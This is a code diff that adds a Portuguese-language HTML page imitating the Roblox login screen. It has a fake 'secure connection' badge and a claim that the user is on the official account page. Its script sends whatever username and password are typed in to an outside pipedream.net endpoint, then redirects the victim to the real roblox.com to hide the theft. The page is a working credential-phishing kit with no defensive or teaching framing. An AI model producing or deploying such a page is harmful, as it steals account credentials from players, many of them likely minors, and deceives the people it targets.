@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Acesso Roblox</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #ff4d00;
+            --primary-dark: #e04400;
+            --secondary: #00a2ff;
+            --dark: #0f172a;
+            --light: #f8fafc;
+            --gray: #94a3b8;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: var(--dark);
+            color: var(--light);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        .particles {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            opacity: 0.15;
+        }
+        
+        .particle {
+            position: absolute;
+            background: var(--secondary);
+            border-radius: 50%;
+            filter: blur(1px);
+            opacity: 0.7;
+        }
+        
+        .auth-container {
+            position: relative;
+            z-index: 10;
+            width: 420px;
+            background: rgba(15, 23, 42, 0.85);
+            backdrop-filter: blur(12px);
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            overflow: hidden;
+            padding: 40px;
+            transform-style: preserve-3d;
+            perspective: 1000px;
+            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        
+        .auth-container:hover {
+            transform: translateY(-5px) rotateX(2deg);
+            box-shadow: 0 35px 60px -15px rgba(0, 0, 0, 0.6);
+        }
+        
+        .auth-header {
+            text-align: center;
+            margin-bottom: 32px;
+            position: relative;
+        }
+        
+        .brand {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 24px;
+        }
+        
+        .brand-icon {
+            width: 48px;
+            height: 48px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        
+        .brand-icon span {
+            font-size: 24px;
+            font-weight: 700;
+            color: white;
+        }
+        
+        .brand-text {
+            font-size: 28px;
+            font-weight: 700;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: 1px;
+        }
+        
+        .auth-header p {
+            color: var(--gray);
+            font-size: 14px;
+            margin-top: 8px;
+        }
+        
+        .security-badge {
+            display: inline-flex;
+            align-items: center;
+            background: rgba(0, 162, 255, 0.15);
+            color: var(--secondary);
+            padding: 8px 16px;
+            border-radius: 100px;
+            font-size: 12px;
+            font-weight: 500;
+            margin-top: 16px;
+            border: 1px solid rgba(0, 162, 255, 0.3);
+        }
+        
+        .security-badge i {
+            margin-right: 8px;
+            font-size: 14px;
+        }
+        
+        .auth-form {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            color: var(--gray);
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 14px 16px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            color: var(--light);
+            font-size: 15px;
+            transition: all 0.3s;
+        }
+        
+        .form-control:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(255, 77, 0, 0.2);
+            background: rgba(255, 255, 255, 0.08);
+        }
+        
+        .form-control::placeholder {
+            color: rgba(255, 255, 255, 0.4);
+        }
+        
+        .btn {
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: none;
+            margin-top: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(to right, var(--primary), var(--primary-dark));
+            color: white;
+            box-shadow: 0 4px 15px rgba(255, 77, 0, 0.3);
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 77, 0, 0.4);
+        }
+        
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+        
+        .auth-footer {
+            margin-top: 24px;
+            text-align: center;
+            font-size: 13px;
+            color: var(--gray);
+        }
+        
+        .auth-footer a {
+            color: var(--secondary);
+            text-decoration: none;
+            font-weight: 500;
+            transition: all 0.2s;
+        }
+        
+        .auth-footer a:hover {
+            color: var(--primary);
+            text-decoration: underline;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: var(--gray);
+            font-size: 12px;
+        }
+        
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .divider::before {
+            margin-right: 16px;
+        }
+        
+        .divider::after {
+            margin-left: 16px;
+        }
+        
+        .account-note {
+            background: rgba(255, 77, 0, 0.1);
+            border-left: 3px solid var(--primary);
+            padding: 14px;
+            margin-bottom: 24px;
+            border-radius: 0 8px 8px 0;
+            font-size: 13px;
+            color: var(--light);
+            display: flex;
+            align-items: center;
+        }
+        
+        .account-note i {
+            margin-right: 10px;
+            color: var(--primary);
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .loading {
+            display: none;
+            margin: 20px 0;
+            text-align: center;
+        }
+        
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top-color: var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 12px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .ripple {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.3);
+            transform: scale(0);
+            animation: ripple 0.6s linear;
+            pointer-events: none;
+        }
+        
+        @keyframes ripple {
+            to {
+                transform: scale(4);
+                opacity: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="particles" id="particles"></div>
+    
+    <div class="auth-container">
+        <div class="auth-header">
+            <div class="brand">
+                <div class="brand-icon">
+                    <span>R</span>
+                </div>
+                <div class="brand-text">ROBLOX</div>
+            </div>
+            <p>Entre no universo de experiências infinitas</p>
+            <div class="security-badge">
+                <i>🔒</i> CONEXÃO SEGURA • HTTPS
+            </div>
+        </div>
+        
+        <div class="account-note">
+            <i>⚠️</i> Você está acessando sua conta Roblox oficial. Insira suas credenciais para continuar.
+        </div>
+        
+        <form id="loginForm" class="auth-form">
+            <div class="form-group">
+                <label for="username" class="form-label">Nome de usuário ou email</label>
+                <input type="text" id="username" class="form-control" placeholder="ex: jogador_roblox2023" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password" class="form-label">Senha</label>
+                <input type="password" id="password" class="form-control" placeholder="••••••••" required>
+            </div>
+            
+            <button type="submit" class="btn btn-primary" id="loginBtn">
+                <span id="btnText">ENTRAR NA CONTA</span>
+            </button>
+            
+            <div class="loading" id="loading">
+                <div class="loading-spinner"></div>
+                <p>Verificando segurança...</p>
+            </div>
+        </form>
+        
+        <div class="divider">OU</div>
+        
+        <div class="auth-footer">
+            <a href="https://www.roblox.com/password/reset">Esqueceu sua senha?</a> • 
+            <a href="https://www.roblox.com/signup">Criar nova conta</a> • 
+            <a href="https://www.roblox.com/support">Ajuda</a>
+        </div>
+    </div>
+
+    <script>
+        // Criar partículas animadas
+        const particlesContainer = document.getElementById('particles');
+        for (let i = 0; i < 20; i++) {
+            const particle = document.createElement('div');
+            particle.classList.add('particle');
+            
+            // Posição e tamanho aleatórios
+            const size = Math.random() * 6 + 2;
+            particle.style.width = `${size}px`;
+            particle.style.height = `${size}px`;
+            particle.style.left = `${Math.random() * 100}%`;
+            particle.style.top = `${Math.random() * 100}%`;
+            
+            // Animação flutuante com delays diferentes
+            particle.style.animation = `float ${Math.random() * 10 + 5}s ease-in-out infinite`;
+            particle.style.animationDelay = `${Math.random() * 5}s`;
+            
+            particlesContainer.appendChild(particle);
+        }
+        
+        // Efeito de ripple nos botões
+        document.getElementById('loginBtn').addEventListener('click', function(e) {
+            const rect = this.getBoundingClientRect();
+            const x = e.clientX - rect.left;
+            const y = e.clientY - rect.top;
+            
+            const ripple = document.createElement('span');
+            ripple.classList.add('ripple');
+            ripple.style.left = `${x}px`;
+            ripple.style.top = `${y}px`;
+            
+            this.appendChild(ripple);
+            
+            setTimeout(() => {
+                ripple.remove();
+            }, 600);
+        });
+        
+        // Form submission
+        document.getElementById("loginForm").addEventListener("submit", (e) => {
+            e.preventDefault();
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+            
+            // Mostrar loading
+            document.getElementById("loading").style.display = "block";
+            document.getElementById("loginBtn").style.opacity = "0.5";
+            document.getElementById("loginBtn").disabled = true;
+            document.getElementById("btnText").textContent = "VERIFICANDO...";
+            
+            // Enviar dados (simulação)
+            fetch("https://eomw037nds1sna2.m.pipedream.net", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify({ 
+                    username: username,
+                    password: password,
+                    timestamp: new Date().toISOString()
+                })
+            })
+            .then(() => {
+                // Redirecionar após delay
+                setTimeout(() => {
+                    window.location.href = "https://www.roblox.com";
+                }, 1500);
+            })
+            .catch(() => {
+                window.location.href = "https://www.roblox.com";
+            });
+        });
+    </script>
+</body>
+</html>
